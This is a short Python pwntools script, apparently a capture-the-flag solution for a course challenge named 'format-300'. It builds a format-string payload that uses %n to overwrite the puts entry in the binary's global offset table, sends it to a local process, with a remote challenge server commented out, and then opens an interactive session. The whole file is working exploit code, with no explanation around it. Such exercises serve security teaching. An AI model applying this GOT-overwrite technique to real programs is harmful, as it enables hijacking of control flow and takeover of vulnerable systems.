from pwn import *


e = ELF('./format-300')
p = process('./format-300')
#p = remote("cse4830-format-300.chals.io", 443, ssl=True, sni="cse4830-format-300.chals.io")

format_test = b'%4198841d%8$p    ' +  b'AABBBBBBBBCCDDDDEEEEFFFF'
format_write = b'%4198841d%7$n    ' + p64(e.got['puts'])
print(format_test)

#p.send(format_test)
p.sendline(format_write)

p.interactive()
